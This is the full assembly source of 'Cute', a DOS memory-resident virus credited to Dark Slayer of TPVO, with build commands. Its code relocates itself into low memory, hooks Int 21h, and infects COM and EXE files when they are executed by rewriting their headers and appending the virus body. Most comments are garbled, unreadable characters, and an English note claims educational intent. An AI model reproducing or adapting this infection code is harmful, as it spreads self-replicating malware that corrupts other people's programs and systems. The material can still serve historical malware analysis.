;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;     Cute                                    \          \     \   \
;            by Dark Slayer of TPVO           \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Cute
; Author     : Dark Slayer of TPVO
; Origin     : Taiwan
; Type : Memory resident  COM
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
; TPVO �� Dark Slayer �a �A�b�e �a����a���a.
;
;
;
;     ��З �a�� �e�a�e��
;
;         tasm /m cute.asm
;         tlink cute.obj
;         exe2com cute.exe cute.com
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;=========================== Begin Cute.asm ==================================

vir_size equ    offset vir_end-offset start     ;
mem_size equ    offset mem_end-offset start     ;

vir_addr equ    580h                            ; ����w���A �w���i ��á

vir_mark equ    0e9h                            ;

        .286                            ; 286 ���w �A�� �b��
        .model  tiny
        .code
        org     0
start:
        push    es                      ;
        mov     di,vir_addr+2           ; DI = 582h
        xor     ax,ax                   ;
        mov     es,ax                   ; 0:vir_addr
        call    delta
delta:
        pop     si                      ; �a����a ���b�� �苡
        sub     si,offset delta-2
        push    cs
        pop     ds
        std                             ; cmpsw �a�e -2 �a �E�a.
        cmpsw                           ; SI �e �a����a ���b�� �A��
        cld                             ; DI �e 580h �a �E�a.
        mov     cx,mem_size             ; �a����a ����
        rep     movsb                   ; �a����a --> 0000:0580h �� ���a
        je      run_host                ;

        mov     bx,vir_addr/10h         ; bx = segment
        mov     al,offset int21         ; ax = Int 21h �����t
        xchg    ax,es:[bx+21h*4-vir_addr/10h]   ; Int 21h �a������
        stosw                           ; AX -> ES:DI
        xchg    bx,es:[bx+21h*4-vir_addr/10h+2] ;
        xchg    bx,ax                   ; �e�� DI �e �a����a �{������ �A�a��
        stosw                           ; Int 21h ���� ��w�a�e ���A ��áЁ���a.
run_host:
        pop     es                      ; es ���� (=PSP)
        lodsw                           ; si = si + 2
        lodsw                           ; si = si + 2
        cmp     sp,0fffch
        jb      exe_host                ; sp < 0fffch? ���e EXE �a�� ���a.
com_host:
        mov     di,100h                 ;
        push    di                      ; COM �|���� ����
        movsw                           ;
        movsw                           ; 4 �a���a ����
        ret                             ; CS:100h �� ����
exe_host:
        lodsw                           ;
        xchg    di,ax                   ; EXE �t ����
        mov     bx,es                   ; bx=es=psp segment
        lea     ax,[bx+di+10h]          ; ax= cs + psp segment + 10h
        push    ax                      ;
        lodsw                           ; ip ���a
        push    ax                      ;
        mov     ds,bx                   ; ds=bx=psp segment
        retf                            ; ���� EXE CS:IP �� ���a

int21:
        cmp     ax,4b00h                ; �a�� ��З���a ?
        jne     i21_exit                ; �a���e �{��
        pusha
        push    ds es
        mov     ax,3d02h                ; �a�� ���e
        int     21h                     ;
        xchg    bx,ax                   ; BX = �a�� Ѕ�i
        push    cs cs
        pop     ds es                   ; ds=es=cs
        mov     ah,3fh                  ; �a�� ����
        mov     cx,18h                  ; CX = ����
        mov     dx,offset vir_end       ; DX = ����
        int     21h                     ;
        mov     si,dx                   ;
        mov     di,offset host_4_bytes  ;
        mov     ax,4202h                ; �a�� �{�a�� ����
        xor     cx,cx                   ;
        cwd                             ;
        int     21h                     ;
                                        ;
        mov     cl,vir_mark             ; 0xE9h
        cmp     byte ptr ds:[si],'M'    ; EXE �a�� ���a ?
        je      infect_exe              ;
infect_com:
        movsw                           ; SI = ����
        movsw                           ; DI = �A���� ��w ����
        xchg    cx,ax                   ; cl=vir mark=0e9h ( jmp code )
                                        ; ax = �a�� ���� �i �ᝡ �a�� �e�a.
        stosb                           ; AL (E9h) --> ES:DI
        xchg    cx,ax                   ;
        sub     ax,3                    ; JMP �t ���e
        stosw
        jmp     infect_common
infect_exe:
        cmp     word ptr ds:[di+4+2],200h-vir_size      ; offset 2=exe mod
        cmc                             ; �p�G exe mod<200h-vir_size�A�h cmc
                                        ;   ����Acf=0�A�_�h cf=1
        adc     word ptr ds:[di+4+4],0  ; exe sector=exe sector+cf
        mov     si,10h
        div     si                      ; dx:ax/10h -> dx=�l�� (�P�V�᪺ ip ��)
                                        ;              ax=�Ӽ� (�ɪ�/10h ����)
        sub     ax,ds:[di+4+8]          ; offset 8=���Y������ (�H para �����),
                                        ;   ax=ax-���Y������=�P�V�᪺ cs �W�q
        xchg    dx,ds:[di+4+14h]        ; offset 14h=exe ip
        xchg    ax,ds:[di+4+16h]        ; offset 16h=distance of exe cs
        stosw                           ; exe cs
        xchg    dx,ax
        stosw                           ; exe ip
        add     di,12h                  ; offset 12h=check sum
infect_common:
        cmp     ds:[di],cl              ;
        je      close                   ;
        mov     ds:[di],cl              ; mark
        mov     ah,40h                  ; �a����a �a��
        mov     cl,vir_size
        cwd
        int     21h                     ;
        mov     ax,4200h                ; ͡���� ��q�a�� ����
        xor     cx,cx
        int     21h                     ; �A�� �a��
        mov     ah,40h
        mov     cl,18h
        mov     dl,offset vir_end
        int     21h                     ;
close:
        mov     ah,3eh
        int     21h                     ; �a�� �h��
        pop     es ds
        popa
i21_exit:
        db      0eah                    ; ���� ������a 21h �� ���a
mem_end:
old21   dw      ?,?                     ; Int 21h �t

host_4_bytes db 0cdh,20h,0,0            ; �|����
vir_end:
        end     start

